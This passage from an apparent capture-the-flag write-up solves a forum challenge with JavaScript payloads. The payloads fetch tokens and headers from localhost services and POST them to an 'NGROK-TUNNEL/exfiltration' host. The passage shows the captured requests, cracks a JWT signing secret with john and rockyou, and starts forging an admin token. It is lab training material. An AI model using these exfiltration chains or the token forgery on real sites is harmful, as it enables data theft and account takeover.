+&lt;<span style="color:#f92672">h1</span>&gt; Improved security, changed the engine to keep data and began to listen to rock <span style="color:#960050;background-color:#1e0010">&amp;</span> roll! &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+Meet token.php and share your indextoken.
+</code></pre></div><p>It seems we have to take the token from index.php again for this stage…</p>
+<h4 id="html-content-10">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>);
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>();
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-10">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 191
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER ACTUAL FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+&lt;<span style="color:#f92672">h1</span>&gt; Improved security, changed the engine to keep data and began to listen to rock <span style="color:#960050;background-color:#1e0010">&amp;</span> roll! &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+Meet /token and share your forumtoken.
+</code></pre></div><p>Ups, another token?</p>
+<h4 id="html-content-11">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/token&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>);
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>();
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-11">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 228
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER ACTUAL FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+&lt;<span style="color:#f92672">h1</span>&gt; Improved security, changed the engine to keep data and began to listen to rock <span style="color:#960050;background-color:#1e0010">&amp;</span> roll! &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+There you go -&gt; ybxamjkbtdmuedtigkpfhervezuqireboioilgvliamkjuqteeheyesffx
+
+</code></pre></div><p>Let’s get the token to make the automation.</p>
+<h4 id="html-content-12">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/token&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secondtoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">170</span>);
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;SECONDTOKEN: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">secondtoken</span>);
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>();
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-12">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 72
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+SECONDTOKEN:  cjmedaxyvqhosbrotmzntitkhgvrwmzrsqoqciflfzkhggyyifocnrlpwv
+</code></pre></div><p>Now we can fetch the server with both of the tokens</p>
+<h4 id="html-content-13">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/token&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secondtoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">170</span>);
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;forumtoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">secondtoken</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                                <span style="color:#a6e22e">fourth</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                                <span style="color:#a6e22e">fourth</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                                <span style="color:#a6e22e">fourth</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">responseText</span>);
+                                        }
+                                }
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>();
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>();
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-13">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 218
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER ACTUAL FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+&lt;<span style="color:#f92672">h1</span>&gt; Improved security, changed the engine to keep data and began to listen to rock <span style="color:#960050;background-color:#1e0010">&amp;</span> roll! &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+You were not authed, but I have just sent you a guest permission.
+</code></pre></div><p>Having sent both of the tokens, it gives us another auth, but we cannot see anything in the <strong>text</strong> of the response of the query. What about checking the headers?</p>
+<h4 id="html-content-14">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/token&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secondtoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">170</span>);
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;forumtoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">secondtoken</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                                <span style="color:#a6e22e">fourth</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                                <span style="color:#a6e22e">fourth</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                                <span style="color:#a6e22e">fourth</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">getAllResponseHeaders</span>());
+                                        }
+                                }
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>();
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>();
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-14">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 356
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+content-length: 218
+content-type: text/html; charset=utf-8
+date: Thu, 30 Apr 2020 14:33:42 GMT
+forum_auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoibm8ifQ.dpWu5YCBeeOBknVGhkPPCz0d30PFABcGIB0aEQEWg5o
+server: Werkzeug/1.0.1 Python/3.8.2
+
+</code></pre></div><p>The server has given us a headers called “forum_auth”, which seems to be a JWT Token.</p>
+<h4 id="decoded-jwt-token">Decoded JWT Token</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;HS256&#34;</span>,
+  <span style="color:#f92672">&#34;typ&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>
+}
+{
+  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;1337&#34;</span>,
+  <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;guest&#34;</span>,
+  <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;h4x0r&#34;</span>,
+  <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;guest@where.ever&#34;</span>,
+  <span style="color:#f92672">&#34;is_admin&#34;</span>: <span style="color:#e6db74">&#34;no&#34;</span>
+}
+</code></pre></div><p>Using HS256 algorithm to cipher: (Using <a href="https://jwt.io/" target="_blank">jwt.io</a>)</p>
+<pre tabindex="0"><code>HMACSHA256(
+  base64UrlEncode(header) + &#34;.&#34; + base64UrlEncode(payload), secret
+)
+</code></pre><p>This type of cipher can be bruteforced with john and, as the server said, “<code>Improved security, changed the engine to keep data and began to listen to rock &amp; roll!</code>” the last words about rock &amp; roll might refer to rockyou’s wordlist.</p>
+<p>We can use <a href="https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py" target="_blank">this script</a> to be able to make john to crack it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python jwt2john.py <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoibm8ifQ.dpWu5YCBeeOBknVGhkPPCz0d30PFABcGIB0aEQEWg5o&#34;</span> &gt; crack.me
+</code></pre></div><pre tabindex="0"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt crack.me
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+cookie           (?)
+1g 0:00:00:00 DONE (2020-04-30 16:53) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>“cookie” is the password used to cipher the jwt token, so let’s try creating ours and sending it through the same header.</p>
+<p>This is the payload I will try in the JWT:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>,
+  <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
+  <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
+  <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;admin@admin.com&#34;</span>,
+  <span style="color:#f92672">&#34;is_admin&#34;</span>: <span style="color:#e6db74">&#34;yes&#34;</span>
+}
+</code></pre></div><p>We will have to use <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" target="_blank">setRequestHeader()</a>.</p>
+<h4 id="html-content-15">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">firsttoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080/token&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secondtoken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">170</span>);
